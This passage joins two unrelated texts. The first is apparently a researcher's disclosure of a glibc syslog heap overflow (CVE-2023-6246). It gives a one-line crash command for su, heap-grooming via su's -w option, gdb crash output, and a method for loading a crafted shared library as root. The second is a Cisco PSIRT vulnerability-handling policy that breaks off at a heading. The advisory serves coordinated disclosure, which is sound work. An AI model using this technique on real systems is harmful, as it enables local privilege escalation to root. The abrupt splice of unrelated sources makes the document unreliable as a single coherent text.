- at lines 182-183, SYSLOG_HEADER() includes __progname (the basename()
  of argv[0]) if LogTag is NULL (e.g., if openlog() was not called, or
  called with a NULL ident argument);

- because a local attacker fully controls argv[0] and hence __progname
  (even when executing a SUID-root program such as su), at line 187 l
  (the return value of __snprintf()) can be larger than sizeof bufs
  (1024), in which case the code block at lines 188-202 is skipped;

- consequently, at line 203 buf is still NULL and bufsize is still 0,
  and at line 206 a very small 1-byte buf is malloc()ated (because
  bufsize is 0);

- at lines 213-214 this small buf is overflowed with the attacker-
  controlled __progname (because l is larger than 1024), and at lines
  221-222 this small buf is further overflowed (because bufsize - l + 1
  is 0 - l + 1, a very large size_t).

========================================================================
Proof of concept
========================================================================

$ (exec -a "`printf '%0128000x' 1`" /usr/bin/su < /dev/null)
Password: Segmentation fault (core dumped)

========================================================================
Exploitation
========================================================================

We decided to exploit this vulnerability through su (the most common
SUID-root program) on Fedora 38. To authenticate a user, su calls the
PAM library, and if the password provided by the user is incorrect, then
PAM calls the glibc's syslog() function without calling openlog() first,
thus allowing us to trigger the buffer overflow in __vsyslog_internal():

------------------------------------------------------------------------
782                         pam_syslog(pamh, LOG_NOTICE,
783                                  "authentication failure; "
784                                  "logname=%s uid=%d euid=%d "
785                                  "tty=%s ruser=%s rhost=%s "
786                                  "%s%s",
787                                  new->name, new->uid, new->euid,
788                                  tty ? (const char *)tty : "",
789                                  ruser ? (const char *)ruser : "",
790                                  rhost ? (const char *)rhost : "",
791                                  (new->user && new->user[0] != '\0')
792                                   ? " user=" : "",
793                                  new->user
794                         );
------------------------------------------------------------------------
107 pam_syslog (const pam_handle_t *pamh, int priority,
108             const char *fmt, ...)
109 {
...
113   pam_vsyslog (pamh, priority, fmt, args);
------------------------------------------------------------------------
 73 pam_vsyslog (const pam_handle_t *pamh, int priority,
 74              const char *fmt, va_list args)
 75 {
 ..
 81       if (asprintf (&msgbuf1, "%s(%s:%s):", pamh->mod_name,
 82                     pamh->service_name?pamh->service_name:"<unknown>",
 83                     _pam_choice2str (pamh->choice)) < 0)
 ..
 91   if (vasprintf (&msgbuf2, fmt, args) < 0)
 ..
 99   syslog (LOG_AUTHPRIV|priority, "%s %s",
100           (msgbuf1 ? msgbuf1 : _PAM_SYSTEM_LOG_PREFIX), msgbuf2);
------------------------------------------------------------------------

But what should we overwrite in the heap to successfully exploit this
buffer overflow? Initially, because su calls setlocale(LC_ALL, ""); at
the very beginning of its su_main() function, we tried to reuse the key
idea from our Baron Samedit exploits (CVE-2021-3156 in Sudo): we wrote a
rudimentary fuzzer to execute su with a random argv[0] and random locale
environment variables and automatically inspect the resulting crashes in
gdb. Unfortunately this fuzzer failed to produce interesting results: we
only obtained a handful of unique crashes, and they did not look very
promising.

However, we did not investigate the reasons for this failure, because
while browsing through su's source code we noticed that su_main() calls
env_whitelist_from_string() to parse the argument of the -w command-line
option:

------------------------------------------------------------------------
1118                 case 'w':
1119                         env_whitelist_from_string(su, optarg);

 704                 env_whitelist_add(su, *one);

 664         const char *env = getenv(name);

 666         if (!env)
 667                 return 1;
 668         if (strv_extend(&su->env_whitelist_names, name))
 669                 err_oom();
 670         if (strv_extend(&su->env_whitelist_vals, env))
 671                 err_oom();
 672         return 0;
 673 }
------------------------------------------------------------------------

Conveniently, env_whitelist_from_string() allows us (attackers) to
malloc()ate and free() an arbitrary number of arbitrary strings at the
very beginning of su's execution: an almost perfect heap feng shui. We
therefore rewrote our fuzzer to execute su with a random argv[0] and a
random whitelist option (instead of random locale environment variables)
and immediately observed numerous unique crashes; among these, three in
particular caught our attention.

========================================================================
1/ Corruption of PAM structures
========================================================================

Surprisingly, our fuzzer directly overwrote two PAM function pointers
(in struct pam_data and struct handler):

------------------------------------------------------------------------
Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.
0x00007fa7d3b0e3ac in _pam_free_data (status=7, pamh=0x56211242ec10) at

------------------------------------------------------------------------
Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.

rax            0x4545454545454545  4991471925827290437
------------------------------------------------------------------------

Although this sounds exciting at first (a call to 0x4141414141414141!)
we decided to not pursue this avenue of exploitation:

- we cannot overwrite such a function pointer with null bytes (because
  we overflow __vsyslog_internal()'s buffer with a null-terminated
  string), but userland addresses contain at least two null bytes;

- we could try to partially overwrite such a function pointer, but we do
  not control the end of the string that overflows __vsyslog_internal()'s
  buffer (the end of the aforementioned pam_syslog() format string), and
  such an uncontrolled, partially overwritten function pointer is very
  unlikely to miraculously point to a useful ROP gadget.

========================================================================
2/ Corruption of heap metadata
========================================================================

Unsurprisingly, our fuzzer also overwrote various pieces of heap
metadata (chunk headers managed internally by the glibc's malloc), and
therefore triggered all kinds of assertion failures and security checks:

------------------------------------------------------------------------
$ grep -A1 __libc_message fuzzer.out | cut -d'"' -f2 | sort -u
...
chunk_main_arena (bck->bk)
chunk_main_arena (fwd)
corrupted double-linked list
corrupted double-linked list (not small)
corrupted size vs. prev_size
corrupted size vs. prev_size in fastbins
double free or corruption (out)
free(): corrupted unsorted chunks
free(): invalid next size (fast)
free(): invalid pointer
free(): invalid size
malloc_consolidate(): invalid chunk size
malloc(): corrupted top size
malloc(): invalid size (unsorted)
malloc(): smallbin double linked list corrupted
malloc(): unaligned tcache chunk detected
malloc(): unsorted double linked list corrupted
munmap_chunk(): invalid pointer
------------------------------------------------------------------------

Although some of these corruptions might be exploitable, we decided to
not pursue this avenue of exploitation either:

- we cannot overwrite a chunk header with a size field and an fd or bk
  pointer that are both valid (they must both contain null bytes to be
  valid), which severely limits our exploitation options;

- in any case, we would probably need a specific heap, mmap, or stack
  address to exploit such a corruption, but we do not have the luxury of
  an information leak, and all these addresses are too heavily
  randomized by ASLR to be brute forced.

========================================================================
3/ Corruption of nss structures
========================================================================

Our fuzzer also produced two crashes that immediately caught our
attention because they are directly related to one of the techniques
that we used to exploit Baron Samedit:

------------------------------------------------------------------------
Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.
__GI___nss_lookup (ni=ni@entry=0x7ffe876a05e8, fct_name=fct_name@entry=0x7fbba214e4e7 "getpwnam_r",

Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.
__nss_module_get_function (module=0x4141414141414141, name=name@entry=0x7f0aed9034e7 "getpwnam_r") at nss_module.c:328

rdi            0x4141414141414141  4702111234474983745
------------------------------------------------------------------------

As discussed in the "2/ struct service_user overwrite" subsection of our
Baron Samedit advisory, if we overwrite the name[] field of a heap-based
struct nss_module with a string of characters that contains a slash (for
example "A/B/C"), then at lines 180-181 the name of a shared library is
constructed ("libnss_A/B/C.so.2"), and at line 187 this shared library
is loaded from our current working directory (because its name contains
a slash, but does not start with a slash) and executed as root (because
su is a SUID-root program):

------------------------------------------------------------------------
170 module_load (struct nss_module *module)
171 {
...
180     if (__asprintf (&shlib_name, "libnss_%s.so%s",
181                     module->name, __nss_shlib_revision) < 0)
...
187     handle = __libc_dlopen (shlib_name);
------------------------------------------------------------------------

Unfortunately, the __progname part (which we control) of the string that
overflows __vsyslog_internal()'s buffer cannot contain a slash (because
__progname is the basename() of argv[0]). Luckily, however, the part of
the overflowing string that we do not control (the pam_syslog() format
string) includes the absolute path of our tty, which contains a slash.
For example, if:

- our tty is /dev/pts/23 (we use forkpty() in our exploit);

- our unprivileged local user is nobody (uid 65534);

- the argv[0] (and hence __progname) that we use to execute su is a long
  string of 'A' characters (longer than 1024);

then we can overwrite the name[] field of a heap-based struct nss_module
with a string of the form:

  "AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost=
 user=root"

Consequently, if we first create the following three directories (in our
current working directory):

  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty="
  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev"
  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts"

and also create the following shared library (in our current working
directory):

  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody
rhost=  user=root.so.2"

then this shared library will eventually be loaded and executed with
full root privileges. In our tests, it takes a few 10,000s of tries to
successfully brute force the exploit parameters (the length of argv[0],
and the whitelist option and its associated environment variables).

Note: this exploit could certainly be made much more efficient; in
theory, it could even be a one-shot exploit, because we do not need to
brute force the ASLR, only the heap layout.

We thank the glibc developers (Carlos O'Donell, Siddhesh Poyarekar,
Arjun Shankar, Florian Weimer, and Adhemerval Zanella in particular),
Red Hat Product Security (Guilherme Suckevicz in particular), and the
members of linux-distros@openwall (Salvatore Bonaccorso in particular).

========================================================================
Timeline
========================================================================

2023-11-07: We sent a preliminary draft of our advisory to Red Hat
Product Security.

2023-11-15: Red Hat Product Security acknowledged receipt of our email.

2023-11-16: Red Hat Product Security asked us if we could share our
exploit with them.

2023-11-17: We sent our exploit to Red Hat Product Security.

2023-11-21: Red Hat Product Security confirmed that our exploit worked,
and assigned CVE-2023-6246 to this heap-based buffer overflow in
__vsyslog_internal().

2023-12-05: Red Hat Product Security sent us a patch for CVE-2023-6246
(written by the glibc developers), and asked us for our feedback.

2023-12-07: While reviewing this patch, we discovered two more minor
vulnerabilities in the same function (an off-by-one buffer overflow and
an integer overflow). We immediately sent an analysis, proof of concept,
and patch proposal to Red Hat Product Security, and suggested that we
directly involve the glibc security team.

2023-12-08: Red Hat Product Security acknowledged receipt of our email,
and agreed that we should directly involve the glibc security team. We
contacted them on the same day, and they immediately replied with very
constructive comments.

2023-12-11: The glibc security team suggested that we postpone the
coordinated disclosure of all three vulnerabilities until January 2024
(because of the upcoming holiday season). We agreed.

2023-12-13: Red Hat Product Security assigned CVE-2023-6779 to the
off-by-one buffer overflow and CVE-2023-6780 to the integer overflow in
__vsyslog_internal().

2024-01-04: We suggested either January 23 or January 30 for the
Coordinated Release Date of these vulnerabilities. The glibc developers
agreed on January 30.

2024-01-12: The glibc developers sent us an updated version of the
patches for these vulnerabilities.

2024-01-13: We reviewed these patches, and sent our feedback to the
glibc developers.

2024-01-15: The glibc developers sent us the final version of the
patches for these vulnerabilities.

2024-01-16: We sent these patches and a draft of our advisory to the
linux-distros@openwall. They immediately acknowledged receipt of our
email.

2024-01-30: Coordinated Release Date (18:00 UTC).

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

